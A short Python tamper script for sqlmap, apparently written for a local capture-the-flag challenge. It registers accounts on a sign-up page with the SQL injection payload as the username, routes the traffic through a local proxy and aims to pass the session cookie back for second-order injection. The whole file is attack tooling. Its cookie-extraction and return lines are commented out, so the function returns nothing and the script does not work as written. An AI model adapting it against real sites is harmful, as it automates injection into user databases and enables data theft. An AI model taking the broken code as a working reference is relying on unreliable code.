#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def create_account(payload):
    s = requests.Session()
    
    # register with username = payload
    # username=noobpk%27+--&password=123456789&re_password=123456789&dangky=
    post_data = { 'username':payload, 'password':'123456789', 're_password':'123456789' ,'dangky':'' }
    proxies = { 'http':'http://127.0.0.1:8080' }
    response = s.post("http://localhost/web200/sql2order/index.php?t=signup", data=post_data, proxies=proxies)
# get cookie
#Set-Cookie: PHPSESSID=l5vdi7j5gq6g978bor44fndt80; path=/
# php_cookie = re.search('PHPSESSID=(.*?);', response.headers['Set-Cookie']).group(1)

# return "PHPSESSID={0}".format(php_cookie)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["Cookie"] = create_account(payload)
    return payload
